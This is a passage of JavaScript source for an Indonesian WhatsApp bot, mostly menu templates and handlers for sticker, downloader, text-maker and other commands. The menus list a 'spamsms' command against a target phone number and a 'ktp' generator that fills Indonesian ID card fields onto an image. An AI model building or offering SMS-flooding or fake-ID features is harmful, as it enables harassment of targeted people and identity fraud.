  ➙ ${prefix}quotesdilan
  ➙ ${prefix}quotesislami
  ➙ ${prefix}katabucin
  ➙ ${prefix}cerpen
  ➙ ${prefix}puisi
  ➙ ${prefix}pantun
  ➙ ${prefix}nasihat
  ➙ ${prefix}ceritahoror
  
*✧ Search Menu ✧*
  ➙ ${prefix}groupwa [query]
  ➙ ${prefix}play [query]
  ➙ ${prefix}ytsearch [query]
  ➙ ${prefix}gimage [query]
  ➙ ${prefix}gimage [query]
  ➙ ${prefix}pinterest [query]
  ➙ ${prefix}wikipedia [query]
  ➙ ${prefix}wikimedia [query]
  ➙ ${prefix}wallpaper [query]
  ➙ ${prefix}unsplash [query]
  ➙ ${prefix}pixiv [query]
  ➙ ${prefix}ringtone [query]
  ➙ ${prefix}katabijak [query]
  ➙ ${prefix}barinly [query]
  ➙ ${prefix}animesearch [query]
  ➙ ${prefix}mangasearch [query]
  ➙ ${prefix}character [query]
  ➙ ${prefix}kusonimes [query]
  ➙ ${prefix}chord [judul lagu]
  
*✧ Sekolah Menu ✧*
  ➙ ${prefix}nulis [teks]
  ➙ ${prefix}brainly [soal]
  ➙ ${prefix}google [query]
  ➙ ${prefix}translate [teks]
  ➙ ${prefix}tst [teks]
  ➙ ${prefix}ocr _Reply image_
  ➙ ${prefix}tts [teks]
  
*✧ Sertifikat Menu ✧*
  ➙ ${prefix}ytsilver [nama]
  ➙ ${prefix}ytgold [nama]
  ➙ ${prefix}tolol [nama]
  ➙ ${prefix}bucin [nama]
  ➙ ${prefix}fuckgirl [nama]
  ➙ ${prefix}fuckboy [nama]
  ➙ ${prefix}goodgirl [nama]
  ➙ ${prefix}goodboy [nama]
  ➙ ${prefix}badgirl [nama]
  ➙ ${prefix}badboy [nama]
  ➙ ${prefix}pacar [nama1 nama2]
  
*✧ Stalk Menu ✧*
  ➙ ${prefix}igstalk [username]
  ➙ ${prefix}tiktokstalk [username]
  ➙ ${prefix}twitterstalk [username]
  ➙ ${prefix}githubstalk [username]
  ➙ ${prefix}youtubestalk [nama channel]
  ➙ ${prefix}ipinfo [IP Address]
  
*✧ Sticker Menu ✧*
  ➙ ${prefix}harta [teks]
  ➙ ${prefix}hartacustom [teks]
  ➙ ${prefix}sticker _reply image/video_
  ➙ ${prefix}toimg _reply sticker_
  ➙ ${prefix}tovideo _reply sticker_
  ➙ ${prefix}togif _Reply sticker_
  ➙ ${prefix}attp [teks]
  ➙ ${prefix}attp2 [teks]
  ➙ ${prefix}ttp [teks]
  ➙ ${prefix}ttp2 [teks]
  ➙ ${prefix}ttp3 [teks]
  ➙ ${prefix}ttp4 [teks]
  ➙ ${prefix}ttp5 [teks]
  ➙ ${prefix}ttp6 [teks]
  ➙ ${prefix}smeme [teks1+teks2] _Reply Image_
  ➙ ${prefix}memecreator [teks1+teks2] _Reply Image_
  ➙ ${prefix}emojimix [emoji1+emoji2]
  ➙ ${prefix}patrick
  ➙ ${prefix}samongus
  ➙ ${prefix}gawrgura
  
*✧ Teks Maker ✧*
     Top Maker
  ➙ ${prefix}style [teks]
  ➙ ${prefix}nulis [teks]
  ➙ ${prefix}harta [teks]
  ➙ ${prefix}hartacustom [teks]
  ➙ ${prefix}qrcode [teks]
  ➙ ${prefix}tiktokmaker [teks1 teks2]
  ➙ ${prefix}pornhub [teks1 teks2]
  ➙ ${prefix}pubg [teks1 teks2]
  ➙ ${prefix}battlefield4 [teks1 teks2]
  ➙ ${prefix}arcade8bit [teks1 teks2]
     Ephoto 360 Maker
  ➙ ${prefix}hologram3d [teks]
  ➙ ${prefix}birthdaycake [teks]
  ➙ ${prefix}lighttext [teks]
  ➙ ${prefix}galaxywallpaper [teks]
  ➙ ${prefix}luxurygold [teks]
  ➙ ${prefix}activegalaxybat [teks]
  ➙ ${prefix}textbyname [teks]
  ➙ ${prefix}starsnight [teks]
  ➙ ${prefix}aovwallpaper [teks]
  ➙ ${prefix}pubgmaskot [teks]
  ➙ ${prefix}mlwallpaper [teks]
  ➙ ${prefix}anonymhacker [teks]
  ➙ ${prefix}freefire [teks]
  ➙ ${prefix}avatardota [teks]
  ➙ ${prefix}avatarlolnew [teks]
  ➙ ${prefix}logogaming [teks]
     Photo Oxy Maker
  ➙ ${prefix}smoke [teks]
  ➙ ${prefix}romance [teks]
  ➙ ${prefix}cup2 [teks]
  ➙ ${prefix}shadow [teks]
  ➙ ${prefix}sandwriting [teks]
  ➙ ${prefix}coffe [teks]
  ➙ ${prefix}love [teks]
  ➙ ${prefix}undergrass [teks]
  ➙ ${prefix}lovemessage [teks]
  ➙ ${prefix}burnpaper [teks] 
  ➙ ${prefix}nature3d [teks]
  ➙ ${prefix}wolfmetal [teks]
  ➙ ${prefix}summer3d [teks]
  ➙ ${prefix}woodenboard [teks]
  ➙ ${prefix}woodheart [teks]
  ➙ ${prefix}flamming [teks]
  ➙ ${prefix}fallleaves [teks]
  ➙ ${prefix}summernature [teks]
  ➙ ${prefix}goldenrose [teks]
  ➙ ${prefix}underwater [teks]
  ➙ ${prefix}carvedwood [teks]
  ➙ ${prefix}harrypotter [teks]
     Text Pro Maker
  ➙ ${prefix}marvelstudio [teks1 teks2]
  ➙ ${prefix}ninjalogo [teks1 teks2]
  ➙ ${prefix}space [teks1 teks2]
  ➙ ${prefix}avenger [teks1 teks2]
  ➙ ${prefix}glitch [teks1 teks2]
  ➙ ${prefix}coolgravity [teks1 teks2]
  ➙ ${prefix}wallgravity [teks1 teks2]
  ➙ ${prefix}wolflogo [teks1 teks2]
  ➙ ${prefix}lionlogo [teks1 teks2]
  ➙ ${prefix}marvelstudio [teks1 teks2]
  ➙ ${prefix}blackpink [teks]
  ➙ ${prefix}neon [teks]
  ➙ ${prefix}greenneon [teks]
  ➙ ${prefix}futureneon [teks]
  ➙ ${prefix}sandwriting [teks]
  ➙ ${prefix}sandsummer [teks]
  ➙ ${prefix}sandengraved [teks]
  ➙ ${prefix}text1917 [teks]
  ➙ ${prefix}holographic [teks]
  ➙ ${prefix}neonlight [teks]
  ➙ ${prefix}metaldark [teks]
  ➙ ${prefix}halloween [teks]
  ➙ ${prefix}bloodfrosted [teks]
  ➙ ${prefix}newyearcard [teks]
  ➙ ${prefix}deluxesilver [teks]
  ➙ ${prefix}minion [teks]
  ➙ ${prefix}toxic [teks]
  ➙ ${prefix}bokeh [teks]
  ➙ ${prefix}natureleaves [teks]
  ➙ ${prefix}fireworksparkle [teks]
  ➙ ${prefix}jokerlogo [teks]
  ➙ ${prefix}icecold [teks]
  ➙ ${prefix}breakwall [teks]
  ➙ ${prefix}roadwarningbox3d [teks]
  ➙ ${prefix}strawberry [teks]
  ➙ ${prefix}thunder [teks]
  ➙ ${prefix}horrorblood [teks]
  ➙ ${prefix}summersand [teks]
  ➙ ${prefix}cloud [teks]
  ➙ ${prefix}luxury [teks]
  ➙ ${prefix}watercolor [teks]
  ➙ ${prefix}foggywindow [teks]
  ➙ ${prefix}harrypotter [teks]
  ➙ ${prefix}impressiveglitch [teks]
  ➙ ${prefix}magma [teks]
  ➙ ${prefix}wonderfulgraffiti [teks]
  
  
*✧ Tools & Internet Menu ✧*
  ➙ ${prefix}tts [teks]
  ➙ ${prefix}tts2 [KodeBahasa+teks]
  ➙ ${prefix}translate [teks]
  ➙ ${prefix}tst2 [KodeBahasa+teks]
  ➙ ${prefix}resum [teks]
  ➙ ${prefix}qrcode [teks]
  ➙ ${prefix}besarkecil [teks]
  ➙ ${prefix}bahasapurba [teks]
  ➙ ${prefix}style [teks]
  ➙ ${prefix}randombahasa [teks]
  ➙ ${prefix}readqr _Reply Foto QR_
  ➙ ${prefix}spamsms [nomor target]
  ➙ ${prefix}ocr _Reply Foto_
  ➙ ${prefix}cekumur _Reply Foto Wajah_
  ➙ ${prefix}cekwajah _Reply Foto Wajah_
  ➙ ${prefix}shortlink [ url ]
  ➙ ${prefix}ssweb [ url ]
  ➙ ${prefix}ssweb2 [ url ]
  ➙ ${prefix}shortlink2 [ url ]
  ➙ ${prefix}shortlink3 [ url ]
  ➙ ${prefix}shortlink4 [ url ]
  ➙ ${prefix}ipinfo [ IP Address ]

*✧ Voice Changer Menu ✧*
_Reply Audio_
  ➙ ${prefix}bass
  ➙ ${prefix}blown
  ➙ ${prefix}deep
  ➙ ${prefix}earrape
  ➙ ${prefix}fast
  ➙ ${prefix}fat
  ➙ ${prefix}nightcore
  ➙ ${prefix}reverse
  ➙ ${prefix}robot
  ➙ ${prefix}slow
  ➙ ${prefix}squirrel

*✧ Anonymous Chat Menu ✧*
  ➙ ${prefix}start ( Start Chat )
  ➙ ${prefix}next ( Next user )
  ➙ ${prefix}stop ( stop Anonymous chat )
  
*✧ Email Sementara ✧*
  ➙ ${prefix}getemail
  ➙ ${prefix}cekidmail [username token]
  ➙ ${prefix}cekmail [username id-mail token]
  
  
━━ 𝗕𝗢𝗧 𝗜𝗡𝗙𝗢 ━━
*Owner Number*
${global.pemilik} (${global.ownernma})

*Media Sosial*
${global.medsos1}: ${global.medsos1nama}
${global.medsos2}: ${global.medsos2nama}
${global.medsos3}: ${global.medsos3nama}

${global.tqto}

_© ${global.botnma}`)
            const tanggal = moment.tz('Asia/Jakarta').format('dddd') + ', ' + moment.tz('Asia/Jakarta').format('LL')
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                listMessage :{
                    title: `Hi ${pushname}`,
                    description: `Please Choose The Menu\n`,
                    buttonText: "Menu",
                    footerText: `_${global.botnma}_\n${tanggal}`,
                    listType: "SINGLE_SELECT",
                    sections: [{
								"title": "🤖🇧​🇴​🇹​ 🇮​🇳​🇫​🇴​🇷​🇲​🇦​🇹​🇮​🇴​🇳​🤖",
								"rows": [
								   {
										"title": "ABOUT THIS BOT",
										"rowId": `${prefix}aboutbot`
									},
									{
										"title": "SEWA BOT",
										"rowId": `${prefix}sewabot`
									},
									{
										"title": "PING",
										"rowId": `${prefix}ping`
									},
									{
										"title": "Term of Service",
										"rowId": `${prefix}tosbot`
									},
									{
										"title": "OWNER THIS BOT",
										"rowId": `${prefix}owner`
									}
								]
							},
							{
								"title": "🇬​🇷​🇴​🇺​🇵​ 🇫​🇪​🇦​🇹​🇺​🇷​🇪​🇸​",
								"rows": [
								   {
										"title": "[👮‍♂️] Admin Group Menu",
										"description": "Fitur khusus admin group",
                                         "rowId": `${prefix}admingroupmenu`
									},
									{
										"title": "[⚙️] Group System Menu",
										"description": "Sistem & Setting Group-Fitur khusus admin group",
										"rowId": `${prefix}groupset`
									},
									{
										"title": "[👨‍👩‍👧‍👦] Group Menu",
										"description": "Fitur untuk semua, di group",
										"rowId": `${prefix}groupmenu`
									}
								]
							},
							{
								"title": "🇧​🇴​🇹​ 🇫​🇪​🇦​🇹​🇺​🇷​🇪​🇸​",
								"rows": [
									{
										"title": "[📑] All Menu",
										"description": "Menampilkan semua fitur bot!",
										"rowId": `${prefix}allmenu`
									},
									{
										"title": "[ 🗿] Anime & Manga Menu",
										"description": "Menampilkan menu anime & manga",
										"rowId": `${prefix}animemenu`
									},
									{
										"title": "[♻️] Convert Menu",
										"description": "Fitur convert file dan media",
										"rowId": `${prefix}convertmenu`
									},
										{
											"title": "[🖼] Creator Maker Menu",
										"description": "Menggabungkan foto dan teks",
										"rowId": `${prefix}creatormakermenu`
										},
										{
											"title": "[📂] Database & Chat Menu [💬]",
										"description": "Menu database dan chat bot",
										"rowId": `${prefix}databasemenu`
										},
										{
											"title": "[📥] Downloader Menu",
										"description": "Menu download media online",
										"rowId": `${prefix}downloadmenu`
										},
										{
										"title": "[ℹ️] Game Checker",
										"description": "Alat pengecek PlayerID Game",
										"rowId": `${prefix}gamechecker`
										},
										{
											"title": "[🎮] Game Menu",
										"description": "Game seru dan asik di sela waktu senggang ",
										"rowId": `${prefix}gamemenu`
										},
										{
											"title": "[📚] Informasi Menu",
										"description": "Cari informasi apa saja di menu ini",
										"rowId": `${prefix}infomenu`
										},
										{
										"title": "[﷽] Islami Menu",
										"description": "Menu Islami | Al-Qur'an, Sholat, Kisah Nabi, dll",
										"rowId": `${prefix}islammenu`
										},
										{
											"title": "[🌚] Meme Menu",
										"description": "Random foto meme kocak",
										"rowId": `${prefix}mememenu`
										},
										{
											"title": "[🌝] Meme Maker Menu",
										"description": "Editor pembuat meme",
										"rowId": `${prefix}mememakermenu`
										},
										{
											"title": "[📰] News Berita Menu",
										"description": "Berita aktual dalam dan luar negeri",
										"rowId": `${prefix}beritamenu`
										},
										{
										"title": "[🎇] Photo Editor",
										"description": "Foto editor dan efek foto!",
										"rowId": `${prefix}photoeditormenu`
									},
									{
										"title": "[💝] Primbon Menu",
										"description": "Menu primbon lengkap",
										"rowId": `${prefix}primbonmenu`
									},
									{
										"title": "[📄] Quotes Menu",
										"description": "Menu quotes dan kata bijak",
										"rowId": `${prefix}quotesmenu`
									},
									{
										"title": "[📝] Quotes Maker Menu",
										"description": "Editor foto | Quotes maker",
										"rowId": `${prefix}quotesmakermenu`
									},
										{
											"title": "[🌌] Random Image",
										"description": "Random berbagai foto",
										"rowId": `${prefix}randomimage`
										},
										{
											"title": "[📋] Random Teks",
										"description": "Random berbagai teks",
										"rowId": `${prefix}randomteks`
										},
										{
											"title": "[🔎] Search Menu",
										"description": "Menu pencarian | Cari apa saja dengan menu ini",
										"rowId": `${prefix}searchmenu`
										},
										{
										"title": "[🏫] Sekolah Menu",
										"description": "Menu pendukung kebutuhan belajar",
										"rowId": `${prefix}sekolahmenu`
										},
										{
											"title": "[🏆] Sertifikat Menu ",
										"description": "Buat berbagai sertifikat mudah dengan nama mu ",
										"rowId": `${prefix}sertifikatmenu`
										},
										{
											"title": "[🔭] Stalk Menu",
										"description": "Menampilkan user profil IG, Tiktok, Github, dll",
										"rowId": `${prefix}stalkmenu`
										},
										{
										"title": "[🫥] Sticker Menu",
										"description": "Buat dan Edit Sticker WhatsApp sesukamu",
										"rowId": `${prefix}stickermenu`
										},
										{
											"title": "[🌠] Teks Maker",
										"description": "Buat teks menjadi foto, dengan pilihan gaya yang banyak",
										"rowId": `${prefix}teksmaker`
										},
										{
											"title": "[🌐] Tools & Internet Menu",
										"description": "Alat yang membantu mu, untuk memudahkan dalam dunia internet",
										"rowId": `${prefix}toolsmenu`
										},
										{
											"title": "[🎵] Voice Changer Menu",
										"description": "Alat untuk merubah suara",
										"rowId": `${prefix}voicechanger`
										}
								]
							},
							{
								"title": "🇧​🇪​🇹​🇦​ 🇫​🇪​🇦​🇹​🇺​🇷​🇪​🇸​",
								"rows": [
									{
										"title": "[💭] Anonymous Chat Menu",
										"description": "Ngobrol dengan sesama pengguna",
										"rowId": `${prefix}anonymouschatmenu`
									},
									{
										"title": "[📧] Email Sementara",
										"description": "Dapatkan Email sementara dan kelola sesuka Kamu",
										"rowId": `${prefix}emailmenu`
									}
								]
							},
							{
								"title": "🇴​🇼​🇳​🇪​🇷​ 🇫​🇪​🇦​🇹​🇺​🇷​🇪​🇸​",
								"rows": [
									{
										"title": "[🤴] Owner Menu",
										"description": "Fitur khusus owner bot",
										"rowId": `${prefix}ownermenu`
									}
								]
							},
							{
								"title": "🤖🇧​🇴​🇹​ 🇮​🇳​🇫​🇴​🇷​🇲​🇦​🇹​🇮​🇴​🇳​🤖",
								"rows": [
								  {
										"title": "ABOUT DEVELOPERS",
									
										"rowId": `${prefix}aboutdev`
									},
									{
										"title": "DONASI",
									
										"rowId": `${prefix}donasi`
									},
									{
										"title": "BOT SCRIPT",
									
										"rowId": `${prefix}script`
									},
									{
										"title": "THANKS TO",
									
										"rowId": `${prefix}tqto`
									},
									{
										"title": "REPORT BUG",
									
										"rowId": `${prefix}report`
									}
								]
							}
						],
          listType: 1
                }
            }), {})
            Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }

            break
            case '12345admingroupmenu':  {
            	dia = m.sender
  	anu = `*✧ Admin Group Menu ✧*
  
  ➙ ${prefix}add [nomor]
  ➙ ${prefix}kick @user
  ➙ ${prefix}groupset
  ➙ ${prefix}tagall
  ➙ ${prefix}hidetag [teks]
  ➙ ${prefix}setname [teks]
  ➙ ${prefix}setdesk [teks]
  ➙ ${prefix}setppgc _Reply image_
  ➙ ${prefix}promote @user
  ➙ ${prefix}demote @user
`
  let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
          break
                      case '12345groupmenu':  {
  	anu = `*✧ Group Menu ✧*
  
  ➙ ${prefix}hidetag [teks]
  ➙ ${prefix}grupinfo 
  ➙ ${prefix}linkgroup
  ➙ ${prefix}listonline 
  ➙ ${prefix}vote
  ➙ ${prefix}couple
  ➙ ${prefix}pasanganku
  ➙ ${prefix}add [nomor]
  ➙ ${prefix}del _Reply pesan bot_ 
  ➙ ${prefix}chatinfo _Reply pesan bot_ 
  ➙ ${prefix}quoted _Reply pesan contain reply_ 
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
           break
          case '12345animemenu':  {
  	anu = `*✧ Anime Manga  Menu ✧*
  
  ➙ ${prefix}animesearch [query]
  ➙ ${prefix}mangasearch [query]
  ➙ ${prefix}character [query]
  ➙ ${prefix}kusonimes [query]
  ➙ ${prefix}storyanime
  ➙ ${prefix}neonime
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345convertmenu':  {
  	anu = `*✧ Convert Menu ✧*
  
  ➙ ${prefix}sticker _Reply image/video_
  ➙ ${prefix}toimg _Reply sticker_
  ➙ ${prefix}tovideo _Reply sticker_
  ➙ ${prefix}togif _Reply sticker_
  ➙ ${prefix}toaudio _Reply video_
  ➙ ${prefix}tomp3 _Reply video_
  ➙ ${prefix}tovn _Reply video/audio_
  ➙ ${prefix}tourl _Reply Foto/Video/Dokumen_
  ➙ ${prefix}imagenobg _Reply Image/foto_
  ➙ ${prefix}topdf _Reply Foto/dokumen_
  ➙ ${prefix}emojimix [emoji1+emoji2]
  ➙ ${prefix}tobinary _Reply pesan teks_
  ➙ ${prefix}dbinary _Reply pesan kode binary_
  ➙ ${prefix}tohex [teks]
  ➙ ${prefix}dhex [kode hex]
  ➙ ${prefix}tomorse [teks]
  ➙ ${prefix}dmorse [kode morse]
  ➙ ${prefix}style [teks]
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345creatormakermenu':  {
  	anu = `*✧ Creator Maker Menu ✧*
  
  
  ➙ ${prefix}gsuggest [teks1+teks2+teks3]
  
  ➙ ${prefix}ytkomen [username+comment] _Reply image_
  
  ➙ ${prefix}phkomen [username+comment] _Reply image_
  
  ➙ ${prefix}yugioh [title+deskripsi+atk+def] _Reply image_
  
  ➙ ${prefix}ktp [Nik+Provinsi+Kabupaten+Nama+tempat tanggal lahir+Jenis kelamin+Jalan+Rt/Rw+Desa+Kecamatan+Agama+Status kawin+Pekerjaan+Warga Negara+Berlaku hingga] _Reply image_
 
  ➙ ${prefix}amongus [teks]
  ➙ ${prefix}idulfitri [teks]
  ➙ ${prefix}ramadhan [teks]
  ➙ ${prefix}twtrump [teks]
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345databasemenu':  {
  	anu = `*✧ Database & Chat Menu ✧*
  
  ➙ ${prefix}delete _Reply message bot_
  ➙ ${prefix}del _Reply message bot_
  ➙ ${prefix}afk [alasan]
  ➙ ${prefix}setcmd [${prefix}command nya] _Reply sticker/image_
  ➙ ${prefix}listcmd
  ➙ ${prefix}delcmd _Reply sticker/image key cmd_
  ➙ ${prefix}lockcmd _Reply sticker/image key cmd_
  ➙ ${prefix}listpc
  ➙ ${prefix}listgc
  ➙ ${prefix}addmsg [teks] _Reply message_
  ➙ ${prefix}getmsg [key msg] 
  ➙ ${prefix}listmsg
  ➙ ${prefix}delmsg [key msg]
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345downloadmenu':  {
  	anu = `*✧ Downloader Menu ✧*
  
  ➙ ${prefix}play [query]
  ➙ ${prefix}ytmp4 [url]
  ➙ ${prefix}ytmp3 [url]
  ➙ ${prefix}tiktok [url]
  ➙ ${prefix}tiktokmp3 [url]
  ➙ ${prefix}igtv [url]
  ➙ ${prefix}igreels [url]
  ➙ ${prefix}twittervideo [url]
  ➙ ${prefix}twitterfoto [url]
  ➙ ${prefix}getvideo [nomor list yts]
  ➙ ${prefix}getmusic [nomor list yts]
  ➙ ${prefix}ringtone [query]
  ➙ ${prefix}gimage [query]
  ➙ ${prefix}pinterest [query]
  ➙ ${prefix}wikimedia [query]
  ➙ ${prefix}wallpaper [query]
  ➙ ${prefix}mediafire [url]
  ➙ ${prefix}sfilemobi [url]
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345gamechecker':  {
  	anu = `*✧ Game Checker ✧*
  
  ➙ ${prefix}ffcek [PlayerID]
  ➙ ${prefix}mlbbcek [PlayerID ServerID]
  ➙ ${prefix}pubgcek [PlayerID]
  ➙ ${prefix}dominocek [UserID]
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345gamemenu':  {
  	anu = `*✧ Game Menu ✧*
  
  ➙ ${prefix}math
  ➙ ${prefix}tebak lirik
  ➙ ${prefix}tebak kata
  ➙ ${prefix}tebak kalimat
  ➙ ${prefix}tebak gambar
  ➙ ${prefix}tebak lagu
  ➙ ${prefix}tebak lontong
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345infomenu':  {
  	anu = `*✧ Informasi Menu ✧*
  
  ➙ ${prefix}wikipedia [query]
  ➙ ${prefix}kbbi [query]
  ➙ ${prefix}cuaca [kota]
  ➙ ${prefix}barinly [query]
  ➙ ${prefix}chord [judul lagu]
  ➙ ${prefix}beasiswa
  ➙ ${prefix}jadwaltv
  ➙ ${prefix}jadwalbola
  ➙ ${prefix}infogempa
  ➙ ${prefix}corona
  ➙ ${prefix}coronaindo
  ➙ ${prefix}jarak [kota1 kota2]
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345islammenu':  {
  	anu = `*✧ Islami Menu ✧*
  
  ➙ ${prefix}listsurah
  ➙ ${prefix}alquran
  ➙ ${prefix}alquranmp3
  ➙ ${prefix}surahmp3
  ➙ ${prefix}ayatmp3
  ➙ ${prefix}jadwalsholat [NamaKota]
  ➙ ${prefix}hadits
  ➙ ${prefix}niatsholat
  ➙ ${prefix}quotesislami
  ➙ ${prefix}asmaulhusna
  ➙ ${prefix}kisahnabi
`
    let message = await prepareWAMessageMedia({ video: global.vidmenu2, gifPlayback: true }, { upload: Pajrin.waUploadToServer })
     const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
     templateMessage: {
         hydratedTemplate: {
           videoMessage: message.videoMessage,
           hydratedContentText: anu,
           hydratedFooterText: `© 2022  ${global.botnma} by ${global.ownernma}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: `${global.medsos1}`,
                                    url: `${global.medsos1url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝗛𝗢𝗪❓',
                                    id: `${prefix}how`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat })
                Pajrin.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
          case '12345mememenu':  {
  	anu = `*✧ Meme Menu ✧*
  
